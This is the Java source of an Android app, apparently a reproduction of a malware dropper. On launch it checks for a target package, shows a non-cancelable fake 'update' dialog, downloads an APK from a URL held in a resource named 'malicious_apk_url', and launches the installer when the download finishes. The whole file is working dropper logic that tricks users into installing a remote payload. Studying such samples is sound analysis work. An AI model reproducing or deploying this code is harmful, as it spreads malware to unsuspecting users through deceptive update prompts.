package com.fs0c131y.kevdownloader;

import android.Manifest;
import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import java.io.File;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity {

    private static final int RC_WRITE_EXTERNAL_STORAGE = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            getPackageManager().getPackageInfo(getString(R.string.malicious_apk_package), PackageManager.GET_ACTIVITIES);
        } catch (PackageManager.NameNotFoundException e) {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setMessage(getString(R.string.update_dialog_message));
            builder.setTitle(getString(R.string.update_dialog_title));
            builder.setPositiveButton(getString(R.string.update_dialog_positive_button_label), new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialogInterface, int i) {
                    downloadApk();
                }
            });
            builder.setCancelable(false);
            builder.create().show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);
    }

    /**
     * Download an APK.
     */
    @AfterPermissionGranted(RC_WRITE_EXTERNAL_STORAGE)
    private void downloadApk() {
        String[] perms = {Manifest.permission.WRITE_EXTERNAL_STORAGE};
        if (EasyPermissions.hasPermissions(this, perms)) {
            try {
                String filename = (Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) +
                        "/") + getString(R.string.malicious_apk_name_downloaded);
                final Uri parse = Uri.parse("file://" + filename);

                File file = new File(filename);
                if (file.exists()) {
                    file.delete();
                }

                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(getString(R.string.malicious_apk_url)));
                request.setDescription(getString(R.string.request_description));
                request.setTitle(getString(R.string.request_title));
                request.setDestinationUri(parse);

                DownloadManager downloadManager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                if (downloadManager != null) {
                    downloadManager.enqueue(request);
                }

                registerReceiver(new BroadcastReceiver() {
                    public void onReceive(Context context, Intent intent) {
                        Intent i = new Intent(Intent.ACTION_VIEW);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        i.setDataAndType(parse, "application/vnd.android.package-archive");
                        startActivity(i);
                        finish();
                    }
                }, new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE));
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            EasyPermissions.requestPermissions(this, getString(R.string.write_external_storage_rationale),
                    RC_WRITE_EXTERNAL_STORAGE, perms);
        }
    }
}
